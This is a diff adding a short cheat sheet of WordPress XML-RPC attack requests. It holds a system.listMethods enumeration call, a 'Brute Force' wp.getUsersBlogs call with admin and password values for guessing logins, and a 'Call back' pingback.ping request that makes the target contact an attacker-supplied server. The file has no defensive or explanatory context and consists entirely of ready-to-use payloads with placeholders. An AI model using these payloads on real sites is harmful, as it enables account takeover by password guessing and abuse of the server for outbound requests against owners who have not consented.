@@ -1,0 +1,22 @@
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+Brute Force
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+Call back
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
